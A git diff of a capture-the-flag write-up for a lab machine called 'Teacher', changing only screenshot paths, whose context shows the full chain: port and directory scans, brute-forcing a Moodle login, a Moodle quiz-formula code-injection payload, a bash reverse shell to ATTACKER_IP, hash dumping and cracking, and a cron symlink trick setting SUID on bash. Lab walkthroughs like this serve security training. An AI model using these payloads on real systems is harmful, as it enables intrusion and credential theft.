@@ -50,7 +50,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.16.5
 ```
 
-![ping](teacher_01_ping.png)
+![ping](screenshots/teacher_01_ping.png)
 
 The host responds, confirming it is reachable before heavier scans.
 
@@ -73,8 +73,8 @@ Why these flags:
 - `-Pn`: skip host discovery (treat host as up)  
 - `-oG`: grepable output for tooling  
 
-![nmap all ports 1](teacher_02_nmap_allports_01.png)
-![nmap all ports 2](teacher_03_nmap_allports_02.png)
+![nmap all ports 1](screenshots/teacher_02_nmap_allports_01.png)
+![nmap all ports 2](screenshots/teacher_03_nmap_allports_02.png)
 
 In this run, only **TCP 80** was open; a large number of ports were closed or filtered.
 
@@ -96,7 +96,7 @@ You can review the same output with:
 cat targeted -l java
 ```
 
-![nmap targeted](teacher_04_nmap_targeted.png)
+![nmap targeted](screenshots/teacher_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -110,7 +110,7 @@ To round out fingerprinting without relying only on `nmap` scripts, we also quer
 whatweb http://10.129.16.5
 ```
 
-![whatweb](teacher_05_whatweb.png)
+![whatweb](screenshots/teacher_05_whatweb.png)
 
 ---
 
@@ -124,7 +124,7 @@ The `http-enum` script surfaces common paths; combined with **directory listing*
 nmap --script http-enum -p80 10.129.16.5 -oN WebScan
 ```
 
-![http-enum](teacher_06_http_enum.png)
+![http-enum](screenshots/teacher_06_http_enum.png)
 
 Notable paths in this run included **`/css/`**, **`/images/`**, and **`/js/`** (listing enabled), plus **`/manual/`**.
 
@@ -132,11 +132,11 @@ Notable paths in this run included **`/css/`**, **`/images/`**, and **`/js/`** (
 
 Under **`/images/`**, we can see a lot of images from website:
 
-![directory listing 1](teacher_07_web_directory_listing_01.png)
+![directory listing 1](screenshots/teacher_07_web_directory_listing_01.png)
 
 One of them, the file named **`5.png`**, is served as an image but is actually **ASCII text**, which explains the browser error when rendering it as a PNG.
 
-![directory listing 2](teacher_08_web_directory_listing_02.png)
+![directory listing 2](screenshots/teacher_08_web_directory_listing_02.png)
 
 Let's verify this hypothesis from our machine:
 
@@ -146,7 +146,7 @@ file 5.png
 cat 5.png
 ```
 
-![5.png plaintext](teacher_09_images_5png_plaintext.png)
+![5.png plaintext](screenshots/teacher_09_images_5png_plaintext.png)
 
 The text is a helpdesk-style note from **Giovanni** revealing almost all of his password except the **last character**, constraining brute-force to a very small space.
 
@@ -158,7 +158,7 @@ We brute-force directories from the site root to find hidden applications and ad
 wfuzz -c --hc=404 --hl=249 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.16.5/FUZZ
 ```
 
-![wfuzz](teacher_10_wfuzz_content_discovery.png)
+![wfuzz](screenshots/teacher_10_wfuzz_content_discovery.png)
 
 **Findings:** **`/moodle/`** exists (redirect). **`/phpmyadmin`** and **`/server-status`** returned **403** in this run.
 
@@ -179,7 +179,7 @@ crunch 15 15 -t Th4C00lTheacha@ >> giovanni_dictionary_pass.txt
 crunch 15 15 -t Th4C00lTheacha^ >> giovanni_dictionary_pass.txt
 ```
 
-![wfuzz moodle 1](teacher_11_wfuzz_moodle_login_01.png)
+![wfuzz moodle 1](screenshots/teacher_11_wfuzz_moodle_login_01.png)
 
 Let's use this dictionary to find the correct password. In my case, all candidates returned `303` with `439` characters, so I filtered for responses with a different size:
 
@@ -189,11 +189,11 @@ wfuzz -c --hh=439 -t 200 -w giovanni_dictionary_pass.txt \
   http://teacher.htb/moodle/login/index.php
 ```
 
-![wfuzz moodle 2](teacher_12_wfuzz_moodle_login_02.png)
+![wfuzz moodle 2](screenshots/teacher_12_wfuzz_moodle_login_02.png)
 
 **Verified credential:** `giovanni : Th4C00lTheacha#`
 
-![moodle authenticated](teacher_13_moodle_authenticated.png)
+![moodle authenticated](screenshots/teacher_13_moodle_authenticated.png)
 
 ---
 
@@ -209,8 +209,8 @@ Use the course UI to add a **Quiz**, then add a **Calculated** question and set 
 /*{a*/`$_GET[0]`;//{x}}
 ```
 
-![add quiz](teacher_14_moodle_quiz_add_activity.png)
-![calculated payload](teacher_15_moodle_calculated_question_payload.png)
+![add quiz](screenshots/teacher_14_moodle_quiz_add_activity.png)
+![calculated payload](screenshots/teacher_15_moodle_calculated_question_payload.png)
 
 To prove execution without immediately exposing a full shell, append an ICMP test to the vulnerable URL (exact URL varies with your session and `returnurl`; the important part is the trailing **`&0=...`** style parameter):
 
@@ -224,11 +224,11 @@ Listen on the attacker host:
 sudo tcpdump -i tun0 icmp -n
 ```
 
-![rce ping 1](teacher_16_moodle_rce_ping_tcpdump_01.png)
+![rce ping 1](screenshots/teacher_16_moodle_rce_ping_tcpdump_01.png)
 
 After sending the request in the URL, we should see the ICMP echo request in `tcpdump`:
 
-![rce ping 2](teacher_17_moodle_rce_ping_tcpdump_02.png)
+![rce ping 2](screenshots/teacher_17_moodle_rce_ping_tcpdump_02.png)
 
 At this point we have confirmed remote command execution (RCE).
 
@@ -248,11 +248,11 @@ Trigger a bash reverse connection through the same **`&0=`** channel (URL-encode
 &0=bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"
 ```
 
-![rev url](teacher_18_reverse_shell_url.png)
+![rev url](screenshots/teacher_18_reverse_shell_url.png)
 
 After triggering the payload, the listener receives the shell:
 
-![rev nc](teacher_19_reverse_shell_netcat.png)
+![rev nc](screenshots/teacher_19_reverse_shell_netcat.png)
 
 You should land as **`www-data`**. The **`giovanni`** home directory is not readable yet as this user.
 
@@ -265,7 +265,7 @@ cd /var/www/html/moodle
 cat config.php
 ```
 
-![config.php](teacher_20_config_php.png)
+![config.php](screenshots/teacher_20_config_php.png)
 
 Using those credentials locally:
 
@@ -279,19 +279,19 @@ USE moodle;
 SELECT username, password FROM mdl_user;
 ```
 
-![mysql login](teacher_21_mysql_login.png)
+![mysql login](screenshots/teacher_21_mysql_login.png)
 
 The `moodle` database contains many tables (388 in this run). The interesting one for credential pivoting is `mdl_user`:
 
-![show databases](teacher_22_mysql_show_databases.png)
+![show databases](screenshots/teacher_22_mysql_show_databases.png)
 
 Let's switch to the `moodle` database:
 
-![use moodle](teacher_23_mysql_use_moodle.png)
+![use moodle](screenshots/teacher_23_mysql_use_moodle.png)
 
 Now we can query `mdl_user` to list the stored password hashes:
 
-![mdl_user](teacher_24_mdl_user_hashes.png)
+![mdl_user](screenshots/teacher_24_mdl_user_hashes.png)
 
 The **`Giovannibak`** row stores a **32-hex** value consistent with **MD5**, which is quick to crack offline compared to the **`$2y$`** bcrypt entries.
 
@@ -299,7 +299,7 @@ The **`Giovannibak`** row stores a **32-hex** value consistent with **MD5**, whi
 
 We crack the MD5 offline (CrackStation, **hashcat** mode `0`, **John** `raw-md5`, etc.) and test reuse as the **Linux** password for **`giovanni`**.
 
-![crackstation](teacher_25_crackstation_giovannibak.png)
+![crackstation](screenshots/teacher_25_crackstation_giovannibak.png)
 
 **Cracked plaintext:** `expelled`
 
@@ -312,7 +312,7 @@ cd ~
 cat user.txt
 ```
 
-![user flag](teacher_26_user_flag_su_giovanni.png)
+![user flag](screenshots/teacher_26_user_flag_su_giovanni.png)
 
 ðŸ **User flag obtained**
 
@@ -339,11 +339,11 @@ chmod +x pspy64
 ./pspy64
 ```
 
-![pspy wget](teacher_27_pspy_wget.png)
+![pspy wget](screenshots/teacher_27_pspy_wget.png)
 
 Observed behavior included **`/usr/bin/backup.sh`** running under cron, with **`tar`** and later **`chmod 777 * -R`** in **`/home/giovanni/work/tmp`**.
 
-![pspy backup](teacher_28_pspy_backup_sh_cron.png)
+![pspy backup](screenshots/teacher_28_pspy_backup_sh_cron.png)
 
 ### 4.2 Inspect `backup.sh` and the unsafe `chmod` glob
 
@@ -353,7 +353,7 @@ The scriptâ€™s logic archives course data, extracts into **`tmp`**, then ap
 cat /usr/bin/backup.sh
 ```
 
-![backup_sh](teacher_29_backup_sh_symlink.png)
+![backup_sh](screenshots/teacher_29_backup_sh_symlink.png)
 
 We can see this code:
 
@@ -379,7 +379,7 @@ ln -sf /usr/bin/backup.sh test
 ls -la /bin/bash
 ```
 
-![suid root](teacher_30_suid_bash_root.png)
+![suid root](screenshots/teacher_30_suid_bash_root.png)
 
 After permissions flip, replace **`/usr/bin/backup.sh`** with a minimal payload that sets the SUID bit on **`/bin/bash`**, wait for another cron execution, then:
 
@@ -389,7 +389,7 @@ whoami
 cat /root/root.txt
 ```
 
-![root flag](teacher_31_root_flag.png)
+![root flag](screenshots/teacher_31_root_flag.png)
 
 ðŸ **Root flag obtained**
 
